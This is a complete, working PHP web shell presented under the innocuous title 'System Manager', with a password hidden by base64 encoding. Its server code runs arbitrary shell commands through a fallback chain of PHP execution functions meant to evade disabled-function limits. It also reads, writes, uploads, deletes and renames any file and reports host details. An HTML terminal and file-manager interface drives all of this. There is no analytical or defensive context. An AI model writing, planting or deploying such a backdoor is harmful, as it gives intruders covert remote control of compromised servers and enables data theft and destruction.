<?php
$k=base64_decode('ZGRueXdhdGVvYQ==');
$m=$_SERVER['REQUEST_METHOD'];
$auth=($m==='POST'?($_POST['auth']??''):($_GET['auth']??''));

if($auth===$k){
@ini_set('display_errors',0);@error_reporting(0);@set_time_limit(0);
$g=$m==='POST'?$_POST:$_GET;
$a=$g['a']??'';
$p=$g['p']??getcwd();
$c=$g['c']??'';
$f=$g['f']??'';
$n=$g['n']??'';
$d=$g['d']??'';

function e($c){
$o='';$c.=' 2>&1';
if(function_exists('shell_exec')){$o=shell_exec($c);}
elseif(function_exists('exec')){exec($c,$r);$o=implode("\n",$r);}
elseif(function_exists('system')){ob_start();system($c);$o=ob_get_clean();}
elseif(function_exists('passthru')){ob_start();passthru($c);$o=ob_get_clean();}
elseif(function_exists('popen')){$h=popen($c,'r');while(!feof($h))$o.=fread($h,4096);pclose($h);}
if(!$o&&function_exists('proc_open')){
$pr=proc_open($c,[1=>['pipe','w'],2=>['pipe','w']],$pp);
$o=stream_get_contents($pp[1]).stream_get_contents($pp[2]);
@fclose($pp[1]);@fclose($pp[2]);@proc_close($pr);}
return$o;}

header('Content-Type: text/plain');
switch($a){
case'cmd':die(e($c));
case'ls':
$items=@scandir($p);
if(!$items)die('[]');
$out=[];
foreach($items as$i){
if($i==='.'||$i==='..')continue;
$fp=$p.DIRECTORY_SEPARATOR.$i;
$out[]=[
'n'=>$i,
't'=>is_dir($fp)?'d':'f',
's'=>@filesize($fp)?:0,
'm'=>@filemtime($fp)?:0,
'p'=>@substr(sprintf('%o',@fileperms($fp)),-4),
'w'=>is_writable($fp)?1:0
];}
die(json_encode($out));
case'read':
$fp=$p.DIRECTORY_SEPARATOR.$f;
$ct=@file_get_contents($fp);
die($ct!==false?$ct:'ERROR');
case'write':
$fp=$p.DIRECTORY_SEPARATOR.$f;
$r=@file_put_contents($fp,$d);
die($r!==false?'OK':'ERROR');
case'upload':
$fp=$p.DIRECTORY_SEPARATOR.$f;
$r=@file_put_contents($fp,base64_decode($d));
die($r!==false?'OK':'ERROR');
case'delete':
$fp=$p.DIRECTORY_SEPARATOR.$f;
die(@unlink($fp)?'OK':'ERROR');
case'rename':
$old=$p.DIRECTORY_SEPARATOR.$f;
$new=$p.DIRECTORY_SEPARATOR.$n;
die(@rename($old,$new)?'OK':'ERROR');
case'mkdir':
$fp=$p.DIRECTORY_SEPARATOR.$f;
die(@mkdir($fp,0755)?'OK':'ERROR');
case'info':
die(json_encode([
'os'=>php_uname(),
'user'=>get_current_user(),
'php'=>phpversion(),
'cwd'=>getcwd(),
'disable'=>ini_get('disable_functions')?:'None'
]));
default:die('READY');
}}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>System Manager</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font:14px/1.6 -apple-system,BlinkMacSystemFont,sans-serif;background:#0d1117;color:#c9d1d9}
.wrap{max-width:1400px;margin:0 auto;padding:20px}
h1{font-size:20px;margin-bottom:20px;color:#58a6ff}
.tabs{display:flex;gap:5px;margin-bottom:20px;border-bottom:1px solid #30363d}
.tab{padding:10px 20px;background:transparent;border:none;color:#8b949e;cursor:pointer;border-bottom:2px solid transparent;transition:.2s}
.tab.active{color:#58a6ff;border-bottom-color:#58a6ff}
.panel{display:none;background:#161b22;padding:20px;border-radius:6px;border:1px solid #30363d}
.panel.active{display:block}
.path{padding:10px;background:#0d1117;border-radius:6px;margin-bottom:15px;font-family:monospace;font-size:13px;border:1px solid #30363d}
.file-list{border:1px solid #30363d;border-radius:6px;max-height:500px;overflow-y:auto}
.file-item{padding:12px;border-bottom:1px solid #21262d;display:flex;justify-content:space-between;align-items:center;transition:.2s}
.file-item:hover{background:#0d1117}
.file-item.dir{color:#58a6ff}
.file-info{display:flex;gap:15px;align-items:center;flex:1;cursor:pointer}
.actions{display:flex;gap:5px}
.btn{padding:6px 12px;border:1px solid #30363d;border-radius:6px;cursor:pointer;font-size:12px;transition:.2s;background:#21262d;color:#c9d1d9}
.btn:hover{background:#30363d;border-color:#58a6ff}
.btn-sm{padding:4px 8px;font-size:11px}
.btn-primary{background:#238636;border-color:#238636;color:#fff}
.btn-danger{background:#da3633;border-color:#da3633;color:#fff}
textarea,input[type=text]{width:100%;padding:10px;border:1px solid #30363d;border-radius:6px;font-family:monospace;font-size:13px;background:#0d1117;color:#c9d1d9}
textarea{min-height:400px;resize:vertical}
.form-group{margin-bottom:15px}
label{display:block;margin-bottom:8px;font-weight:600;color:#58a6ff}
.output{background:#0d1117;color:#c9d1d9;padding:15px;border-radius:6px;font-family:monospace;font-size:13px;max-height:500px;overflow-y:auto;white-space:pre-wrap;border:1px solid #30363d}
.info-grid{display:grid;grid-template-columns:150px 1fr;gap:10px;font-size:13px}
.info-grid div{padding:10px;background:#0d1117;border-radius:6px;border:1px solid #30363d}
.toolbar{display:flex;gap:8px;margin-bottom:15px;flex-wrap:wrap}
</style>
</head>
<body>
<div class="wrap">
<h1>⚡ System Manager</h1>
<div class="tabs">
<button class="tab active" onclick="showTab('cmd')">Terminal</button>
<button class="tab" onclick="showTab('files')">Files</button>
<button class="tab" onclick="showTab('editor')">Editor</button>
<button class="tab" onclick="showTab('info')">Info</button>
</div>

<div id="cmd" class="panel active">
<div class="form-group">
<label>Command:</label>
<input type="text" id="cmdInput" placeholder="whoami" onkeypress="if(event.key==='Enter')runCmd()">
<button class="btn btn-primary" onclick="runCmd()" style="margin-top:10px">Execute</button>
</div>
<div class="output" id="cmdOutput">Ready...</div>
</div>

<div id="files" class="panel">
<div class="path">📁 <span id="currentPath">loading...</span></div>
<div class="toolbar">
<button class="btn btn-sm" onclick="goUp()">⬆ Parent</button>
<button class="btn btn-sm" onclick="refreshFiles()">🔄 Refresh</button>
<button class="btn btn-sm btn-primary" onclick="newFile()">+ File</button>
<button class="btn btn-sm btn-primary" onclick="newFolder()">+ Folder</button>
<button class="btn btn-sm btn-primary" onclick="uploadFile()">⬆ Upload</button>
</div>
<div class="file-list" id="fileList">Loading...</div>
</div>

<div id="editor" class="panel">
<div class="form-group">
<label>Editing: <span id="editFile" style="color:#8b949e">No file selected</span></label>
<textarea id="fileContent" placeholder="Select a file to edit..."></textarea>
<button class="btn btn-primary" onclick="saveFile()" style="margin-top:10px">💾 Save</button>
</div>
</div>

<div id="info" class="panel">
<div class="info-grid" id="infoContent">Loading...</div>
</div>
</div>

<script>
const AUTH='<?=base64_encode($k)?>';
let CWD='';
let EDITING='';

function showTab(t){
document.querySelectorAll('.tab').forEach(e=>e.classList.remove('active'));
document.querySelectorAll('.panel').forEach(e=>e.classList.remove('active'));
event.target.classList.add('active');
document.getElementById(t).classList.add('active');
if(t==='files'&&!CWD)refreshFiles();
if(t==='info')loadInfo();
}

async function api(data){
try{
const r=await fetch('',{
method:'POST',
headers:{'Content-Type':'application/x-www-form-urlencoded'},
body:new URLSearchParams({auth:atob(AUTH),...data})
});
return await r.text();
}catch(e){
return'ERROR: '+e.message;
}}

async function runCmd(){
const c=document.getElementById('cmdInput').value.trim();
if(!c)return;
document.getElementById('cmdOutput').textContent='Executing...';
const o=await api({a:'cmd',c});
document.getElementById('cmdOutput').textContent=o||'(no output)';
}

async function refreshFiles(){
if(!CWD){
const info=await api({a:'info'});
try{
const j=JSON.parse(info);
CWD=j.cwd||'/';
}catch(e){
CWD='/';
}}
document.getElementById('fileList').innerHTML='<div style="padding:20px;text-align:center">Loading...</div>';
const r=await api({a:'ls',p:CWD});
try{
const files=JSON.parse(r);
const list=document.getElementById('fileList');
list.innerHTML='';
if(files.length===0){
list.innerHTML='<div style="padding:20px;text-align:center;color:#8b949e">Empty directory</div>';
}else{
files.forEach(f=>{
const div=document.createElement('div');
div.className='file-item'+(f.t==='d'?' dir':'');
const size=f.s<1024?f.s+'B':f.s<1048576?(f.s/1024).toFixed(1)+'KB':(f.s/1048576).toFixed(1)+'MB';
div.innerHTML=`
<div class="file-info" onclick="${f.t==='d'?`openDir('${f.n.replace(/'/g,"\\'")}')`:''}" style="${f.t==='d'?'':'cursor:default'}">
<span>${f.t==='d'?'📁':'📄'}</span>
<span style="flex:1">${f.n}</span>
<span style="color:#8b949e;font-size:11px">${size}</span>
<span style="color:#8b949e;font-size:11px">${f.p||'----'}</span>
</div>
<div class="actions">
${f.t==='f'?`<button class="btn btn-sm" onclick="event.stopPropagation();editFile('${f.n.replace(/'/g,"\\'")}')">Edit</button>`:''}
<button class="btn btn-sm" onclick="event.stopPropagation();renameItem('${f.n.replace(/'/g,"\\'")}')">Rename</button>
<button class="btn btn-sm btn-danger" onclick="event.stopPropagation();deleteItem('${f.n.replace(/'/g,"\\'")}')">Delete</button>
</div>`;
list.appendChild(div);
});
}
document.getElementById('currentPath').textContent=CWD;
}catch(e){
document.getElementById('fileList').innerHTML='<div style="padding:20px;color:#da3633">Error: '+e.message+'</div>';
}}

function openDir(n){
CWD=CWD.replace(/\/+$/,'')+'/'+n;
refreshFiles();
}

function goUp(){
const parts=CWD.split('/').filter(p=>p);
if(parts.length>0){
parts.pop();
CWD='/'+parts.join('/');
}else{
CWD='/';
}
refreshFiles();
}

async function editFile(n){
EDITING=n;
document.getElementById('editFile').textContent=n;
document.getElementById('fileContent').value='Loading...';
showTab('editor');
const c=await api({a:'read',p:CWD,f:n});
document.getElementById('fileContent').value=c==='ERROR'?'Error reading file':c;
}

async function saveFile(){
if(!EDITING){alert('No file selected');return;}
const c=document.getElementById('fileContent').value;
const r=await api({a:'write',p:CWD,f:EDITING,d:c});
alert(r==='OK'?'✅ File saved successfully':'❌ Error: '+r);
if(r==='OK')refreshFiles();
}

async function deleteItem(n){
if(!confirm(`Delete "${n}"?`))return;
const r=await api({a:'delete',p:CWD,f:n});
alert(r==='OK'?'✅ Deleted':'❌ Error: '+r);
if(r==='OK')refreshFiles();
}

async function renameItem(n){
const nn=prompt('New name:',n);
if(!nn||nn===n)return;
const r=await api({a:'rename',p:CWD,f:n,n:nn});
alert(r==='OK'?'✅ Renamed':'❌ Error: '+r);
if(r==='OK')refreshFiles();
}

async function newFile(){
const n=prompt('File name:');
if(!n)return;
const r=await api({a:'write',p:CWD,f:n,d:''});
alert(r==='OK'?'✅ Created':'❌ Error: '+r);
if(r==='OK')refreshFiles();
}

async function newFolder(){
const n=prompt('Folder name:');
if(!n)return;
const r=await api({a:'mkdir',p:CWD,f:n});
alert(r==='OK'?'✅ Created':'❌ Error: '+r);
if(r==='OK')refreshFiles();
}

async function uploadFile(){
const n=prompt('Save as:');
if(!n)return;
const i=document.createElement('input');
i.type='file';
i.onchange=async()=>{
const file=i.files[0];
if(!file)return;
const reader=new FileReader();
reader.onload=async()=>{
const b64=btoa(String.fromCharCode(...new Uint8Array(reader.result)));
const r=await api({a:'upload',p:CWD,f:n,d:b64});
alert(r==='OK'?'✅ Uploaded':'❌ Error: '+r);
if(r==='OK')refreshFiles();
};
reader.readAsArrayBuffer(file);
};
i.click();
}

async function loadInfo(){
const r=await api({a:'info'});
try{
const info=JSON.parse(r);
document.getElementById('infoContent').innerHTML=`
<div>Operating System</div><div>${info.os}</div>
<div>Current User</div><div>${info.user}</div>
<div>PHP Version</div><div>${info.php}</div>
<div>Working Directory</div><div>${info.cwd}</div>
<div>Disabled Functions</div><div style="word-break:break-all">${info.disable}</div>
`;
}catch(e){
document.getElementById('infoContent').innerHTML='<div style="grid-column:1/-1;color:#da3633">Error loading info</div>';
}}
</script>
</body>
</html>
